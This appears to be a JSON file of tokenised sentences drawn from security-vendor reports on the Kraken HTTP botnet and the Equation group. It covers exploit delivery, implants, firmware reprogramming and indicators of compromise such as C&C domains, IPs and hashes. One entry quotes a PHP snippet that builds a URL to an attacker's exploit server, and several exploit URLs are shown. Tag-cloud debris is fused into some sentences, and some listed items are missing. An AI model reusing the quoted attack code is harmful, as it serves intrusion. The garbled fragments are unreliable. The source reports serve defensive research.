caro casino cebit cellphone chat cloud cms cobra coding conference credit card cve cyber espionage cyber espionage ; malware cyper espionage .", "1781": "targattacks dll dns domain eicar email exploit exploits eyjafjallajoekull facebook fake fake alert fake av false positive fifa firefox fix flame flash fraud ftp gaming google google play hack heartbleed ie iframe i m infection injection iot java khobe likejacking link links lizamoon lnk lottery mac mail mails In this case , the attachment is a Microsoft Word document which tries to exploit the vulnerability described in CVE-2012 - 0158 in order to drop and execute malware dubbed \" Kraken HTTP \" .", "1782": "The G DATA security solutions detect the malicious document ( 08E834B6D4123F0AEA27D042FCEAF992 ) as Exploit . CVE-2012 - 0158.AH and G DATA 's proactive Exploit Protection technology also prevents the attack before the PC can be infected .", "1783": "\" Kraken HTTP \" is sold on at least one underground market as a commercial product .", "1784": "Someone , who claims not to be the author of the malware , promoted the malware with a kind of banner which has quite a visual impact .", "1785": "Have a look at the \" ad \" that was published back in December 2014 .", "1786": "The banner describes the botnet .", "1787": "The attackers could visit websites that are regarded as illegal in the respective country and could then ask for ransom and threaten to release information about the alleged violation to any seemingly official entity who would then investigate against the victim .", "1788": "The flyer also reveals the price of the malware : The basic binary costs $ 320 and each plugin must be paid for separately , for example $ 50 for the file stealer , $ 60 for the ad - clicker and up to $ 350 for a configurable form grabber .", "1789": "Accepted payment methods are the usual virtual currencies and pre - paid options .", "1790": "malware malware windows matousec microsoft microsoft windows mobile network news osama bin laden password pdf pharmacy phishing picture pinterest playstation poker pos privacy pup ransom rat removal instructions riskware rsa scan scareware shopping short url snowden socail engineering soccer social engineering social network spain spam spyeye sql stuxnet targattacks testing tool trojan uefa uefa euro 2012 underground update url uroburos usb virus bulletin vulnerabilities warning wifi windows windows 8 wordpress worm youtube zero day zeus zynga 404 419 A price list found on a different website , also posted in December 2014 , lists the binary 's price as $ 270 and some additional modules , such as a \" Edit Hosts module \" ( $ 15 ) , a \" Botkill module \" ( $ 30 ) and a \" Bitcoin monitor module\"($20 ) .", "1791": "Furthermore , \" Kraken HTTP \" is advertised as \" a new , revolutionary botnet [ \u2026 ] and very noob - friendly \" .", "1792": "Noob is a word describing \" that someone is new to a game , concept , or idea ; implying a lack of experience . \" But now let 's have a look at what the botnet really is .", "1793": "After having a glimpse at the ad designed to promote the malware , we analyzed a sample of it : 3917107778F928A6F65DB34553D5082A , which is detected as Gen : Variant . Zusy.118945 .", "1794": "We decided to analyze some features mentioned in the flyer and on the other website to evaluate their power and implementation .", "1795": "Feature : \" Bypass UAC \" As expected , the malware does not really bypass the UAC .", "1796": "It rather uses a classic trick already used by several malware instances .", "1797": "It uses a legitimate Microsoft binary in order to execute itself with administrator permissions .", "1798": "We already presented this technique in our G DATA SecurityBlog article about the Beta Bot .", "1799": "C:\\Program Files\\VMWare\\VMware Tools\\ C:\\Program Files ( x86)\\VMware\\WMware Tools\\ C:\\WINDOWS\\system32\\VBoxtray.exe Furthermore , the malware checks if following applications analysts usually use are being executed .", "1800": "Wireshark : a network analyzer Fiddler : a web proxy used to debug HTTP flow .", "1801": "We can see the tools detection .", "1802": "If one of the elements mentioned above is detected , the malware will display a rather poetic dialog popup .", "1803": "So , the anti - VM is really rudimentary .", "1804": "If the additional tools are not installed on the virtual machine the malware can be perfectly executed .", "1805": "Feature : \" Folder , Bot file & All file dropped are hidden \" The folders & bot files simply have the \" hidden \" attribute set in Microsoft Windows .", "1806": "If you configure you system to show hidden files and directories , you can perfectly see them .", "1807": "So , the botnet does not use advanced techniques to hide itself .", "1808": "The key is HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows .", "1809": "The malware repeatedly checks whether this entry is removed .", "1810": "In case the entry is removed , the malware will create a new one .", "1811": "However , instead of removing it , we can simple rename the path to the executable in order to switch off the persistence mechanism .", "1812": "So , the malware does not have any clever persistence features either .", "1813": "Feature : \" Path & variable encrypted \" We identified two kinds of \" encrypted \" data .", "1814": "Feature : \" Bitcoin monitor plugin \" The Bitcoin monitor plugin is even more amusing .", "1815": "It is not advertised on the flyer but on the other website we found .", "1816": "The malware monitors the infected user 's clipboard .", "1817": "If the user copies a Bitcoin address to the clipboard , it will be replaced by an address pre - configured by the botmaster .", "1818": "A Bitcoin address is an identifier of 26 - 35 alphanumeric characters which represent the owner of a Bitcoin wallet , for example something like 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy .", "1819": "We can easily imagine that the plugin 's \" test \" is prone to produce false positives , because any alphanumeric text copied by the user will be automatically changed without reason if it has a length between 26 and 35 characters .", "1820": "Ok , we admit that the German word \" Kraftfahrzeughaftpflichtversicherung \" ( 36 ) would not be harmed when copied , but what about \" Bundesausbildungsfoerderungsgesetz \" ( 34 ) or \" radioimmunoelectrophoresis \" ( 27 ) ? Just kidding .", "1821": "But any string , from strong passwords to bank account numbers and more could be affected .", "1822": "\" Kraken HTTP \" is only the first stage in this attack and can be seen as reconnaissance tool .", "1823": "The experts of the G DATA SecurityLabs had access to the panel used by \" Kraken HTTP \" but the source code is protected by a commercial packer called IonCube loader .", "1824": "Nevertheless , we can reveal some screenshots of the administration panel which are available on the underground .", "1825": "Note that some of the texts contain mistakes .", "1826": "We suppose that the Kraken botnet was developed by a beginner .", "1827": "The malware does not include advanced malware technologies and no groundbreaking innovations , even though those were advertised .", "1828": "Many sensitive strings are not encrypted , such as installation paths , anti - virus listings , insults against the analysts and much more .", "1829": "To sell the botnet malware , the author used a quite sexy marketing flyer , but , actually , the malware turned out to be rather simple .", "1830": "\" Kraken HTTP \" was said to be used during an espionage campaign against the energy sector , especially against targets in the UAE .", "1831": "We have now identified a specific target from this geographical region and have obtained one of the spear phishing emails used .", "1832": "Even though the targets that are known by now are rather high - level targets , the malware code as well as its features is not advanced .", "1833": "We are surprised to see this piece of code has been used carrying out targeted attacks rather than broader criminal activities .", "1834": "It is not surprising that attackers use vulnerabilities that are older , because , unfortunately , many computers are likely to be still out of date and so the attack works .", "1835": "Despite the fact that the vulnerability used is not a new one , the malware does not have the common features that we saw during other targeted attack campaigns .", "1836": "Compared to incidents like Uroburos , the Kraken malware is not good enough to \" catch the big fish \" if we want to stick with to the metaphor .", "1837": "So , from the current point of view , there are three theories .", "1838": "The attackers who developed the Kraken malware might have chosen to diversify their business and chose to attack special interest targets themselves .", "1839": "The attackers identified infected machines in the business sector and followed the tracks to see what else they might be able to get from the companies .", "1840": "The actual espionage team voluntary chose to use a kind of usual and rather simply botnet malware in order to distract analysts from seeing a deeper meaning behind this attack and make them disregard it as ' daily cybercrime business ' .", "1841": "Attached Files .", "1842": "back 2007 - 2015 G Data Software AG .", "1843": "All rights reserved Contact | Imprint", "1844": "The Equation group is a highly sophisticated threat actor that has been engaged in multiple CNE ( computer network exploitation ) operations dating back to 2001 , and perhaps as early as 1996 .", "1845": "The Equation group uses multiple malware platforms , some of which surpass the well - known \" Regin \" threat in complexity and sophistication .", "1846": "The Equation group is probably one of the most sophisticated cyber attack groups in the world ; and they are the most advanced threat actor we have seen .", "1847": "We call this threat actor the Equation group because of their love for encryption algorithms and obfuscation strategies and the sophisticated methods used throughout their operations .", "1848": "In general , the Equation group uses a specific implementation of the RC5 encryption algorithm throughout their malware .", "1849": "Some of the most recent modules use RC6 , RC4 and AES too , in addition to other cryptographic functions and hashes .", "1850": "One technique in particular caught our attention and reminded us of another complex malware , Gauss .", "1851": "The GrayFish loader uses SHA-256 one thousand times over the unique NTFS object ID of the victim 's Windows folder to decrypt the next stage from the registry .", "1852": "This uniquely ties the infection to the specific machine , and means the payload can not be decrypted without knowing the NTFS object ID .", "1853": "the Equation group use ? So far , we 've identified several malware platforms used exclusively by the Equation group .", "1854": "They are .", "1855": "The Equation group uses an implant known as DoubleFantasy ( the internal Kaspersky Lab name ) for the validation of their victims .", "1856": "The implant serves two purposes .", "1857": "Decrypted DoubleFantasy configuration block In the configuration block above , one can easily spot the internal version 8.2.0.6 .", "1858": "Decrypting configuration blocks from all known DoubleFantasy samples , we obtained the following internal version numbers .", "1859": "Interestingly , the most popular versions are 8 and 12 .", "1860": "Considering the latest version of DoubleFantasy is 13 and we have only identified 4 major versions , we are probably seeing only a small part of the group 's activity .", "1861": "EQUATIONDRUG is one of the group 's most complex espionage platforms .", "1862": "The platform was developed between 2003 and 2013 and subsequently replaced by GrayFish .", "1863": "It appears to have been created as an upgrade from the EQUATIONLASER platform .", "1864": "A victim does n't immediately get infected with EQUATIONDRUG .", "1865": "First , the attackers infect them with DOUBLEFANTASY , which is a validator - style plugin .", "1866": "If the victim is confirmed as interesting to the attackers , the EQUATIONDRUG installer is delivered .", "1867": "By default , a core set of modules is installed onto the target 's computer together with EQUATIONDRUG , giving attackers full control over the operating system .", "1868": "In cases where the basic features of the malware are not enough , EquationDrug supports the addition of new plugins to extend its functionality .", "1869": "We found 35 different plugins for EquationDrug and 18 drivers .", "1870": "EquationDrug 's core modules , designed for hooking deep into the OS , do not contain a trusted digital signature and can not be run directly on modern operating systems .", "1871": "The code checks whether the OS version predates Windows XP/2003 .", "1872": "Some of the plugins were designed originally for use on Windows 95/98/ME .", "1873": "If the target is using a modern operating system such as Windows 7 , the attackers use the TripleFantasy or GrayFish platforms .", "1874": "EquationDrug has an integrated countdown timer , presumably designed to self- destruct if commands are not received from the C&C for a period of time ( several months ) .", "1875": "The information stolen from the PC and prepared for transmission to the C&C is stored in encrypted form throughout several fake font files ( * .FON ) inside the Windows\\Fonts folder on the victim 's computer .", "1876": "GRAYFISH is the most modern and sophisticated malware implant from the Equation group .", "1877": "By all indications , GrayFish was developed between 2008 and 2013 and is compatible with all modern versions of Microsoft 's operating systems , including Windows NT 4.0 , Windows 2000 , Windows XP , Windows Vista , Windows 7 and 8 \u2013 both 32-bit and 64-bit versions .", "1878": "GrayFish includes a highly sophisticated bootkit , which is more complex than any we 've seen before .", "1879": "This suggests developers of the highest caliber are behind its creation .", "1880": "This allows it to control the launching of Windows at each stage .", "1881": "In fact , after infection , the computer is not run by itself more : it is GrayFish that runs it step by step , making the necessary changes on the fly .", "1882": "After GrayFish starts Windows , it launches a multi - stage mechanism ( four to five stages ) of decryption to achieve code execution within the Windows environment .", "1883": "It then runs the functional modules that are stored inside the Windows registry .", "1884": "Each stage decodes and executes the next , and the entire platform will only start after successful execution of all levels .", "1885": "To bypass modern OS security mechanisms that block the execution of untrusted code in kernel mode , GrayFish exploits several legitimate drivers , including one from the CloneCD program .", "1886": "This driver ( ElbyCDIO.sys ) contains a vulnerability which GrayFish exploits to achieve kernel - level code execution .", "1887": "Despite the fact that the vulnerability was discovered in 2009 , the digital signature has not yet been revoked .", "1888": "There are no malicious executable modules at all on the filesystem of an infected system .", "1889": "An interesting observation : the first stage GRAYFISH loader computes the SHA-256 hash of the NTFS of system folder ( % Windows% or % System% ) Object_ID one thousand times .", "1890": "The result is used as an AES decryption key for the next stage .", "1891": "This is somewhat similar to Gauss , which computed the MD5 hash over the name of its target folder 10,000 times and used the result as the decryption key .", "1892": "Fanny is a computer worm created by the Equation group in 2008 and distributed throughout the Middle East and Asia .", "1893": "Fanny used two zero - day exploits , which were later uncovered during the discovery of Stuxnet .", "1894": "To spread , it used the Stuxnet LNK exploit and USB sticks .", "1895": "For escalation of privilege , Fanny used a vulnerability patched by the Microsoft bulletin MS09 - 025 , which from 2009 was also used in one of the early versions of Stuxnet .", "1896": "It 's important to point out that these two exploits were used in Fanny before they were integrated into Stuxnet , indicating the EQUATION group had access to these zero - days before the Stuxnet group .", "1897": "Actually , the similar type of usage of both exploits together in different computer worms , at around the same time , indicates that the EQUATION group and the Stuxnet developers are either the same or working closely together .", "1898": "The main purpose of Fanny appears to have been the mapping of air - gapped networks .", "1899": "For this , it used a unique USB - based command and control mechanism .", "1900": "When a USB stick is infected , Fanny creates a hidden storage area on the stick .", "1901": "When the stick is plugged into the air - gapped computer , Fanny will recognize the commands and execute them .", "1902": "This effectively allowed the Equation group to run commands inside air - gapped networks through the use of infected USB sticks , and also map the infrastructure of such networks .", "1903": "The Fanny C&C server is currently sinkholed by Kaspersky Lab .", "1904": "The victims map looks as follows .", "1905": "group use ? We observed the following exploits used by the Equation group in their malware .", "1906": "At least four of these were used as zero - days by the EQUATION group .", "1907": "In addition to these , we observed the use of unknown exploits , possibly zero - day , against Firefox 17 , as used in the TOR Browser .", "1908": "An interesting case is the use of CVE-2013 - 3918 , which was originally used by the APTgroup behind the 2009 Aurora attack .", "1909": "The EQUATION group captured their exploit and repurposed it to target government users in Afghanistan .", "1910": "group malware ? The Equation group relies on multiple techniques to infect their victims .", "1911": "These include .", "1912": "The attacks that use physical media ( CD - ROMs ) are particularly interesting because they indicate the use of a technique known as \" interdiction \" , where the attackers intercept shipped goods and replace them with Trojanized versions .", "1913": "One such incident involved targeting participants at a scientific conference in Houston .", "1914": "Upon returning home , some of the participants received by mail a copy of the conference proceedings , together with a slideshow including various conference materials .", "1915": "The exact method by which these CDs were interdicted is unknown .", "1916": "We do not believe the conference organizers did this on purpose .", "1917": "At the same time , the super - rare DOUBLEFANTASY malware , together with its installer with two zero - day exploits , do n't end up on a CD by accident .", "1918": "Another example is a Trojanized Oracle installation CD that contains an EQUATIONLASER Trojan dropper alongside the Oracle installer .", "1919": "Here 's a look at a typical infection cycle .", "1920": "about the EQUATION group ? Although the implementation of their malware systems is incredibly complex , surpassing even Regin in sophistication , there is one aspect of the EQUATION group 's attack technologies that exceeds anything we have ever seen before .", "1921": "We were able to recover two HDD firmware reprogramming modules from the EQUATIONDRUG and GRAYFISH platforms .", "1922": "The EQUATIONDRUG HDD firmware reprogramming module has version 3.0.1 while the GRAYFISH reprogramming module has version 4.2.0 .", "1923": "These were compiled in 2010 and 2013 , respectively , if we are to trust the PE timestamps .", "1924": "The EQUATION group HDD firmware reprogramming plugin has the internal ID 80AA , which is a unique number in the groups ' plugin ID table .", "1925": "This allows other plugins to identify and use it as required .", "1926": "Both 32- and 64-bit versions of the plugin were found .", "1927": "This achieves several important things .", "1928": "The plugin version 4 is more complex and can reprogram 12 drive \" categories \" .", "1929": "The classes supported are .", "1930": "The main function to reflash the HDD firmware receives an external payload , which can be compressed by LZMA .", "1931": "The disk is targeted by a specific serial number and reprogrammed by a series of ATA commands .", "1932": "For example , in the case of Seagate drives , we see a chain of commands : \" FLUSH CACHE \" ( E7 ) \u2192 \" DOWNLOAD MICROCODE \" ( 92 ) \u2192 \" IDENTIFY DEVICE \" ( EC ) \u2192 WRITE \" LOG EXT \" ( 3F ) .", "1933": "Depending on the reflashing request , there might be some unclear data manipulations written to the drive using \" WRITE LOG EXT \" ( 3F ) .", "1934": "For WD drives , there is a sub - routine searching for ARM NOP opcodes in read data , and then used further in following writes .", "1935": "Overall , the plugin uses a lot of undocumented , vendor - specific ATA commands , for the drives mentioned above as well as all the others .", "1936": "The EQUATION group 's HDD firmware reprogramming module is extremely rare .", "1937": "During our research , we 've only identified a few victims who were targeted by this module .", "1938": "This indicates that it is probably only kept for the most valuable victims or for some very unusual circumstances .", "1939": "indicating who is behind the EQUATION group ? With threat actor groups as skilled as the Equation team , mistakes are rare .", "1940": "Nevertheless , they do happen .", "1941": "Some of the keywords forgotten in the modules that we analyzed include .", "1942": "Interestingly , the VTT strings above appear to contain a timestamp and an infection counter .", "1943": "Between four events \u2013 10 October 2008 , 30th of July 2008 , 3rd of September 2008 and 30 of September 2008 \u2013 we count an average of 2000 infections per month , if the serial number increases linearly .", "1944": "This could indicate that the EQUATION group hits about 2000 users per month , although it 's possible some \" uninteresting \" victims may be disinfected .", "1945": "Note : T he codename GROK appears in several documents published by Der Spiegel , where \" a keylogger \" is mentioned .", "1946": "Our analysis indicates EQUATIONGROUP 's GROK plugin is indeed a keylogger on steroids that can perform many other functions .", "1947": "The victims of the Equation group were observed in more than 30 countries , including Iran , Russia , Syria , Afghanistan , Kazakhstan , Belgium , Somalia , Hong Kong , Libya , United Arab Emirates , Iraq , Nigeria , Ecuador , Mexico , Malaysia , United States , Sudan , Lebanon , Palestine , France , Germany , Singapore , Qatar , Pakistan , Yemen , Mali , Switzerland , Bangladesh , South Africa , Philippines , United Kingdom , India and Brazil .", "1948": "Victims generally fall into the following categories .", "1949": "Combining statistics from KSN and our sinkhole , we counted more than 500 victims worldwide .", "1950": "A lot of infections have been observed on servers , often domain controllers , data warehouses , website hosting and other types of servers .", "1951": "At the same time , the infections have a self - destruct mechanism , so we can assume there were probably tens of thousands of infections around the world throughout the history of the Equation group 's operations .", "1952": "As an interesting note , some of the \" patients zero \" of Stuxnet seem to have been infected by the EQUATION group .", "1953": "It is quite possible that the EQUATION group malware was used to deliver the STUXNET payload .", "1954": "group implants use ? The Equation group uses a vast C&C infrastructure that includes more than 300 domains and more than 100 servers .", "1955": "The servers are hosted in multiple countries , including the US , UK , Italy , Germany , Netherlands , Panama , Costa Rica , Malaysia , Colombia and Czech Republic .", "1956": "All C&C domains appear to have been registered through the same two major registrars , using \" Domains By Proxy \" to mask the registrant 's information .", "1957": "Kaspersky Lab is currently sinkholing a couple dozen of the 300 C&C servers .", "1958": "by the EQUATION group ? The EQUATION group sometimes selects its victims with surgical precision .", "1959": "When precision is not possible , the victims are targeted by a validator ( DOUBLEFANTASY ) implant and subsequently disinfected if they do not appear to be \" interesting \" to the attackers .", "1960": "2013 - 03 - 02 \u2013 technicalconsumerreports[.]com / modular / assemble.php?params = YoGKKdExT[snip ] cS5kS5t0bvGQyB8miDu+Agn \u2013 detected HEUR : Exploit . Script . Generic The attack was unsuccessful as it was caught by our product and the user was protected .", "1961": "The attack was targeting Firefox 17 ( TOR Browser ) , using an unknown exploit that we have not recovered .", "1962": "Looking further , we identified a few other known Equation servers used in similar attacks even earlier .", "1963": "2012 - 12 - 11 \u2013 technology - revealed[.]com / diagram / navigate.html?overlay = AL[snip]OISn6sI1&sn = d1[SNIP]dd These attacks were delivered in several ways \u2013 for example , while the user visited a number of Islamic Jihadist discussion forums , or via advertisements on popular websites in the Middle East .", "1964": "We were able to obtain one of these PHP scripts embedded in a discussion forum .", "1965": "This PHP script provides a multitude of interesting information about the attacks .", "1966": "It was first designed to work as part of vBulletin , a commercial forum platform .", "1967": "It specifically checks if the visitor 's username MD5 matches two values .", "1968": "Converting the ranges to their respective countries ( except for 64.38.3.50 , which is the only specific IP mentioned ) we get the following TOP 3 countries that will NOT be exploited .", "1969": "This means that the attackers have taken special care not to infect users visiting from certain ISPs in these countries .", "1970": "If the visitors are from any other IP range , the PHP script constructs an exploitation URL which includes the logged in vBulletin forum name .", "1971": "$ htt=\"http://technology - revealed[.]com / expand / order.php?design = ABRSRgDQlkUALAxGANDrRu QQofe6Y0THS8E3hfBC+M+k7CdBmTH5gAkLvgV8EV3ULW+7KoUjbJ4UOFU6SVOtgEK7zTgPPNoDH z4vKecDGe7OzDmJlvwKvc5uYg / I/5x9 \" ; $ htt=$htt.\"&sn=\".bin2hex(substr($u,0,14 ) ) ; The vBulletin forum username is stored in hex , as the \" sn= \" parameter to the exploit site .", "1972": "Interestingly , the PHP script produces a different HTML page for iPhone visitors .", "1973": "This indicates that the exploit server is probably aware of iPhone visitors and can deliver exploits for them as well ; otherwise , the exploitation URL can simply be removed for these visitors .", "1974": "Most recently , the attackers used Java exploits , delivered through a specific server to visitors from the Middle East via advertising networks on popular websites .", "1975": "Here 's an example .", "1976": "standardsandpraiserepurpose[.]com / login?qq=5eaae4d[SNIP]0563&rr=1&h = cc593a6bfd8e1e 26c2734173f0ef75be3527a205 , header > 26 < /header > These 2013 - 2014 attacks make use of a new domain , standardsandpraiserepurpose[.]com .", "1977": "Interesting to point out the similarity in the URL construction , with parameters \" rr=1 \" , followed by \" h= \" a value resembling a SHA1 hash , possibly the specific targeted username .", "1978": "Other collected \" h= \" values include the following .", "1979": "Considering the length and format , one might suspect they are a SHA1 hash , however , unlike the forum MD5 hashes , we could n't break any of them .", "1980": "The exploits from standardsandpraiserepurpose[.]com targeted several Kaspersky Lab users and were all unsuccessful .", "1981": "The server attempts three different Java exploits , containing the same payload stored as \" info.dat \" inside the Java archive .", "1982": "These are simple downloaders that contain shellcode to download and execute the next stage from the C&C.", "1983": "Unfortunately , we were n't able to download a copy of the next stage as the URL was already dead at the time of checking , or else it is only served and built specifically for victims at specific IPs .", "1984": "Another unusual aspect of targeting included multiple infection attempts against users of a certain satellite internet provider in Afghanistan .", "1985": "are used by the EQUATION group ? The Equation group uses the RC5 and RC6 encryption algorithms quite extensively throughout their creations .", "1986": "They also use simple XOR , substitution tables , RC4 and AES .", "1987": "RC5 and RC6 are two encryption algorithms designed by Ronald Rivest in 1994 and 1998 .", "1988": "They are very similar to each other , with RC6 introducing an additional multiplication in the cypher to make it more resistant .", "1989": "Both cyphers use the same key setup mechanism and the same magical constants named P and Q.", "1990": "The RC5/6 implementation from Equation group 's malware is particularly interesting and deserves special attention because of its specifics .", "1991": "In the screenshot above , one can observe the main loop of a RC6 key setup subroutine extracted from one of the Equation group samples .", "1992": "This is how it looks in pseudocode .", "1993": "See : http://www.ussrback.com/crypto/misc/rc5ref.c Interestingly , the so - called Q constant usage is a bit different in the reference code .", "1994": "Inside the Equation group malware , the encryption library uses a subtract operation with the constant 0x61C88647 .", "1995": "In most publicly available RC5/6 code , this constant is usually stored as 0x9E3779B9 , which is basically -0x61C88647 .", "1996": "Since an addition is faster on certain hardware than a subtraction , it makes sense to store the constant in its negative form and adding it instead of subtracting .", "1997": "RC5 key setup reference document RFC2040 ( https://tools.ietf.org/html/rfc2040 ) Searching for \" 0x61C88647 0xB7E15163 \" on Google results in barely two pages of results , indicating this combination of constants is relatively rare .", "1998": "Most of the hits are on Chinese forums .", "1999": "Searching for the 2-inverse constant \" 0x9E3779B9 0xB7E15163 \" results in a whopping 2500 hits .", "2000": "Interestingly , Regin implements the same constants in its RC5 code .", "2001": "Here 's how the RC5 key setup code looks in Regin .", "2002": "In total , we identified 20 different compiled versions of the RC5/6 code in the Equation group malware .", "2003": "Although similar , the RC5 code is a bit different in Regin \u2013 none of the known Equation samples uses the \" C7 41 10 \" opcode for setting up the P constant , as Regin does .", "2004": "This suggests that the EQUATION group and the Regin group are two different entities .", "2005": "platforms compare with Regin ? To attack their victims , the EQUATION group used several cyberespionage platforms over the last 14 years .", "2006": "These include .", "2007": "With EQUATIONDRUG , we observed the use of virtual file systems , which is also one of the trademarks of the Regin group .", "2008": "The GRAYFISH registry - based architecture is more flexible , stealthy and more complex than Regin , for several reasons .", "2009": "In addition , we can compare the two platforms by their startup mechanisms .", "2010": "While 64-bit Regin uses a service that loads the remaining of the code from the end of the last partition on disk and further from the VFSes , GRAYFISH takes this a step further .", "2011": "Next , it loads all the other malware stages from the registry , making it almost completely invisible in terms of footprint .", "2012": "Due to the complexity of this process and the knowledge and resources required to implement something like it , the mechanism appears to be out of the reach of most advanced threat groups in the world except the EQUATION group .", "2013": "These as well as other general observations lead us to conclude that the EQUATION group surpasses Regin in sophistication and resources .", "2014": "We discovered one of the first EQUATIONDRUG modules during our research into the Regin nation - state APT operation .", "2015": "Somewhere in the Middle East , there is a computer we are calling the \" The Magnet of Threats \" because in addition to Regin , it was also infected by Turla , ItaDuke , Animal Farm and Careto / Mask .", "2016": "When we tried to analyze the Regin infection on this computer , we identified another module which did not appear to be part of the Regin infection , nor any of the other APTs .", "2017": "Further investigation into this module led us to the discovery of the EQUATIONDRUG platform .", "2018": "By looking for similarities using statistical analysis and correlation as well as C&C - based pivoting , we identified several other malware families : DOUBLEFANTASY , EQUATIONLASER and FANNY .", "2019": "Further research enabled us to find GRAYFISH and TRIPLEFANTASY .", "2020": "Another interesting detail is that several EQUATION group victims appear to have been previously infected by Regin and , in one case , had both Regin and EQUATIONDRUG .", "2021": "This makes us believe the two groups are different from each other .", "2022": "Indicators of compromise ( \" one of each \" ) Name EquationLaser MD5 752af597e6d9fd70396accc0b9013dbe Type EquationLaser installer Compiled Mon Oct 18 15:24:05 2004 Name Disk from Houston \" autorun.exe \" with EoP exploits MD5 6fe6c03b938580ebf9b82f3b9cd4c4aa Type EoP package and malware launcher Compiled We d Dec 23 15:37:33 2009 Name DoubleFantasy MD5 2a12630ff976ba0994143ca93fecd17f Type DoubleFantasy installer Compiled Fri Apr 30 01:03:53 2010 Name EquationDrug MD5 4556ce5eb007af1de5bd3b457f0b216d Type EquationDrug installer ( \" LUTEUSOBSTOS \" ) Compiled Tue Dec 11 20:47:12 2007 Name GrayFish MD5 9b1ca66aab784dc5f1dfe635d8f8a904 Type GrayFish installer Compiled Compiled : Fri Feb 01 22:15:21 2008 ( installer ) Name Fanny MD5 0a209ac0de4ac033f31d6ba9191a8f7a Type Fanny worm Compiled Mon Jul 28 11:11:35 2008 Name TripleFantasy MD5 9180d5affe1e5df0717d7385e7f54386 loader ( 17920 bytes .DLL ) MD5 ba39212c5b58b97bfc9f5bc431170827 encrypted payload ( .DAT ) Compiled various , possibly fake Name _ SD_IP_CF.dll - unknown MD5 03718676311de33dd0b8f4f18cffd488 Type DoubleFantasy installer + LNK exploit package Compiled Fri Feb 13 10:50:23 2009 Name nls_933w.dll MD5 11fb08b9126cdb4668b3f5135cf7a6c5 Type HDD reprogramming module Compiled Tue Jun 15 20:23:37 2010 Name standalonegrok_2.1.1.1 / GROK MD5 24a6ec8ebf9c0867ed1c097f4a653b8d Type GROK keylogger Compiled Tue Aug 09 03:26:22 2011 C&C servers ( hostnames and IPs ) : DoubleFantasy : advancing - technology[.]com avidnewssource[.]com businessdealsblog[.]com businessedgeadvance[.]com charging - technology[.]com computertechanalysis[.]com config.getmyip[.]com - SINKHOLED BY KASPERSKY LAB globalnetworkanalys[.]com melding - technology[.]com myhousetechnews[.]com - SINKHOLED BY KASPERSKY LAB newsterminalvelocity[.]com - SINKHOLED BY KASPERSKY LAB selective - business[.]com slayinglance[.]com successful - marketing - now[.]com - SINKHOLED BY KASPERSKY LAB taking - technology[.]com techasiamusicsvr[.]com - SINKHOLED BY KASPERSKY LAB technicaldigitalreporting[.]com timelywebsitehostesses[.]com www.dt1blog[.]com www.forboringbusinesses[.]com EquationLaser : lsassoc[.]com - re - registered , not malicious at the moment gar - tech[.]com - SINKHOLED BY KASPERSKY LAB Fanny : webuysupplystore.mooo[.]com - SINKHOLED BY KASPERSKY LAB EquationDrug : newjunk4u[.]com easyadvertonline[.]com newip427.changeip[.]net - SINKHOLED BY KASPERSKY LAB ad - servicestats[.]net - SINKHOLED BY KASPERSKY LAB subad - server[.]com - SINKHOLED BY KASPERSKY LAB ad - noise[.]net ad - void[.]com aynachatsrv[.]com damavandkuh[.]com fnlpic[.]com monster - ads[.]net nowruzbakher[.]com sherkhundi[.]com quik - serv[.]com nickleplatedads[.]com arabtechmessenger[.]net amazinggreentechshop[.]com foroushi[.]net technicserv[.]com goldadpremium[.]com honarkhaneh[.]net parskabab[.]com technicupdate[.]com technicads[.]com customerscreensavers[.]com darakht[.]com ghalibaft[.]com adservicestats[.]com 247adbiz[.]net - SINKHOLED BY KASPERSKY LAB webbizwild[.]com roshanavar[.]com afkarehroshan[.]com thesuperdeliciousnews[.]com adsbizsimple[.]com goodbizez[.]com meevehdar[.]com xlivehost[.]com gar - tech[.]com - SINKHOLED BY KASPERSKY LAB downloadmpplayer[.]com honarkhabar[.]com techsupportpwr[.]com webbizwild[.]com zhalehziba[.]com serv - load[.]com wangluoruanjian[.]com islamicmarketing[.]net noticiasftpsrv[.]com coffeehausblog[.]com platads[.]com havakhosh[.]com toofanshadid[.]com bazandegan[.]com sherkatkonandeh[.]com mashinkhabar[.]com quickupdateserv[.]com rapidlyserv[.]com GrayFish : ad - noise[.]net business - made - fun[.]com businessdirectnessource[.]com charmedno1[.]com cribdare2no[.]com dowelsobject[.]com following - technology[.]com forgotten - deals[.]com functional - business[.]com housedman[.]com industry - deals[.]com listennewsnetwork[.]com phoneysoap[.]com posed2shade[.]com quik - serv[.]com rehabretie[.]com speedynewsclips[.]com teatac4bath[.]com unite3tubes[.]com unwashedsound[.]com TripleFantasy : arm2pie[.]com brittlefilet[.]com cigape[.]net crisptic01[.]net fliteilex[.]com itemagic[.]net micraamber[.]net mimicrice[.]com rampagegramar[.]com rubi4edit[.]com rubiccrum[.]com rubriccrumb[.]com team4heat[.]net tropiccritics[.]com Equation group 's exploitation servers : standardsandpraiserepurpose[.]com suddenplot[.]com technicalconsumerreports[.]com technology - revealed[.]com IPs hardcoded in malware configuration blocks : 149.12.71.2 190.242.96.212 190.60.202.4 195.128.235.227 195.128.235.231 195.128.235.233 195.128.235.235 195.81.34.67 202.95.84.33 203.150.231.49 203.150.231.73 210.81.52.120 212.61.54.239 41.222.35.70 62.216.152.67 64.76.82.52 80.77.4.3 81.31.34.175 81.31.36.174 81.31.38.163 81.31.38.166 84.233.205.99 85.112.1.83 87.255.38.2 89.18.177.3 Kaspersky products detection names .", "2023": "Securelist , the resource Follow us for Kaspersky Lab experts ' technical research , Academy Business Eugene SecureList ThreatPost Daily analysis , and thoughts .", "2024": "Academy Business Eugene ThreatPost Daily Kaspersky Lab global Website Eugene Kaspersky Blog Daily Business Daily Kaspersky Lab B2C Blog Kaspersky Lab B2B Blog Academy Business ThreatPost Daily Academy Business Daily Kaspersky Lab security news service Kaspersky Lab Academy TLP : White For any inquiries , please contact intelreports@kaspersky.com Kaspersky Lab HQ 39A/3 Leningradskoe Shosse Moscow , 125212 Russian Federation more contact details Tel : + 7 - 495 - 797 - 8700 Fax : + 7 - 495 - 797 - 8709"}